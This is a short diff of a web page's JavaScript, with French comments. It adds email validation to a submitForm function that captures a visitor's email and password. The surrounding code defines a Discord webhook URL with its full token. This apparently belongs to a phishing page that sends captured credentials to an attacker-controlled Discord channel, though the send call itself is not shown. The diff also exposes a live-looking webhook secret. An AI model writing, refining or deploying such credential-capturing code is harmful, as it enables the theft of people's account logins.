@@ -83,6 +83,13 @@
         function submitForm() {
             var email = document.getElementById("email").value;
             var password = document.getElementById("password").value;
+
+            // Regex pour valider l'email
+            var regex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            if (!regex.test(email)) {
+                alert("Adresse email invalide !");
+                return; // Stoppe l'exécution si l'email est invalide
+            }
     
             var webhookURL = "https://discord.com/api/webhooks/1338928805384814612/d7n5El6F7K0SFNeb7j75V4ro2IE2HN9cd4CAB1yKQPlUh2pP7yf0Q5j2bDEuRqaDeAKG";
     
